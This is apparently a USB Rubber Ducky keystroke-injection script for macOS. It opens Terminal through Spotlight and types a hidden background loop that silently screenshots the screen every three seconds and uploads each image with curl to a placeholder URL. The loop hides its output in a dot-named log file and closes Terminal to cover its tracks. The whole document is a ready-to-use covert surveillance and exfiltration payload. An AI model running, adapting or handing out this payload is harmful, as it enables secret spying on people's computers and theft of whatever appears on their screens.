REM kill it with pkill -f screencapture

DEFAULT_DELAY 200
GUI space
DELAY 500
STRING Terminal
ENTER
DELAY 800
STRING nohup bash -c 'while true; do screencapture -x /tmp/screen.png && curl -s -F "file=@/tmp/screen.png" URL && rm /tmp/screen.png; sleep 3; done' > /tmp/.siphon.log 2>&1 &
ENTER
DELAY 800
GUI q
ENTER
